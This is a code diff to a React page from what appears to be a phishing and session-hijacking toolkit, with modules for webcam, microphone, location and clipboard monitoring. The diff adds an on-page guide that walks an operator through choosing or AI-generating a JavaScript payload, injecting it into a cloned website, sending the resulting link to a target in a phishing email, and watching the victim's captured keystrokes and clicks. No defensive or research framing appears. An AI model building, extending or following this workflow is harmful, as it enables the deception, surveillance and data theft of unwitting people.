@@ -3,7 +3,7 @@
 
 import { useState, useEffect, useRef } from 'react';
 import { LiveTracker, type TrackedEvent } from '@/components/live-tracker';
-import { JavaScriptLibrary, type JsPayload } from '@/components/javascript-library';
+import { JavaScriptLibrary } from '@/components/javascript-library';
 import { Separator } from '@/components/ui/separator';
 import { useLocalStorage } from '@/hooks/use-local-storage';
 import { LocationTracker } from '@/components/location-tracker';
@@ -13,7 +13,7 @@ import { ClipboardMonitor } from '@/components/clipboard-monitor';
 import { SessionHistory } from '@/components/session-history';
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
 import { Badge } from '@/components/ui/badge';
-import { Webcam, Video, Mic, Terminal } from 'lucide-react';
+import { Webcam, Video, Mic, Terminal, Info } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { useToast } from '@/hooks/use-toast';
 import { useAuth } from '@/hooks/use-auth';
@@ -22,6 +22,7 @@ import Image from 'next/image';
 import { Textarea } from '@/components/ui/textarea';
 import { Label } from '@/components/ui/label';
 import { AdvancedPageCloner } from '@/components/advanced-page-cloner';
+import type { JsPayload } from '@/types';
 
 export default function LiveTrackerPage() {
   const [selectedPayload, setSelectedPayload] = useState<JsPayload | null>(null);
@@ -181,6 +182,34 @@ export default function LiveTrackerPage() {
         <h1 className="font-headline text-3xl font-semibold">Live Session Tracker & Hijacking</h1>
         <p className="text-muted-foreground">Inject JS payloads, hijack devices, and monitor real-time user interactions.</p>
       </div>
+      
+      <Card className="bg-primary/10 border-accent/20">
+          <CardHeader>
+            <div className="flex items-center gap-3">
+                <Info className="h-6 w-6 text-accent" />
+                <CardTitle>How to Use This Module</CardTitle>
+            </div>
+          </CardHeader>
+          <CardContent className="text-sm text-muted-foreground">
+            <ol className="list-decimal list-inside space-y-2">
+              <li>
+                <strong>Select a Payload:</strong> In the "JavaScript Payload Library" below, choose a premade payload, create a custom one, or generate one with AI. Clicking "Use Payload" will load it into the cloner.
+              </li>
+              <li>
+                <strong>Configure the Cloner:</strong> In the "Advanced Webpage Cloner", enter the URL of the site you want to inject the payload into.
+              </li>
+              <li>
+                <strong>Generate Link:</strong> Click "Clone & Inject JS" followed by "Generate Public Link". This creates a unique URL for your malicious page.
+              </li>
+              <li>
+                <strong>Deliver the Link:</strong> Send the generated URL to your target (e.g., via a phishing email).
+              </li>
+              <li>
+                <strong>Monitor Activity:</strong> When the target opens the link, a new session will appear in the "Session History". Click on it to see all captured data (keystrokes, clicks, etc.) in the "Activity Log".
+              </li>
+            </ol>
+          </CardContent>
+        </Card>
 
       <AdvancedPageCloner selectedPayload={selectedPayload}/>
       
